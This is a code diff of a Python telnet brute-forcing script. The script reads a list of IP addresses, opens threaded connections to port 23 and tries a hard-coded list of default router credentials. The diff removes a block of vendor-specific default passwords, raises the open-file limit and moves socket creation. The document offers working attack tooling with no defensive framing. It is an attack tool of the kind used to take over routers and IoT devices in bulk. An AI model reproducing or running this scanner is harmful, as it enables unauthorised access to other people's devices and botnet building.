@@ -1,8 +1,8 @@
-//Telnet Bruter
 import threading
 import sys, os, re, time, socket
 from Queue import *
 from sys import stdout
+resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
 
 if len(sys.argv) < 4:
 	print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
@@ -77,20 +77,6 @@ combo = [
 	"adm:",
 	"default:default",
 	"root:696969",
-	"Alphanetworks:wrgg19_c_dlwbr_dir300",
-	"Alphanetworks:wrgn49_dlob_dir600b",
-	"Alphanetworks:wrgn23_dlwbr_dir600b",
-	"Alphanetworks:wrgn22_dlwbr_dir615",
-	"Alphanetworks:wrgnd08_dlob_dir815",
-	"Alphanetworks:wrgg15_di524",
-	"Alphanetworks:wrgn39_dlob.hans_dir645",
-	"Alphanetworks:wapnd03cm_dkbs_dap2555",
-	"Alphanetworks:wapnd04cm_dkbs_dap3525",
-	"Alphanetworks:wapnd15_dlob_dap1522b",
-	"Alphanetworks:wrgac01_dlob.hans_dir865",
-	"Alphanetworks:wrgn23_dlwbr_dir300b",
-	"Alphanetworks:wrgn28_dlob_dir412",
-	"Alphanetworks:wrgn39_dlob.hans_dir645_V1"
 ]
 
 ips = open(sys.argv[1], "r").readlines()
@@ -123,8 +109,8 @@ class router(threading.Thread):
 				username=""
 			else:
 				username=passwd.split(":")[0]
+			tn = socket.socket()
 			try:
-				tn = socket.socket()
 				tn.settimeout(8)
 				tn.connect((self.ip,23))
 			except Exception:
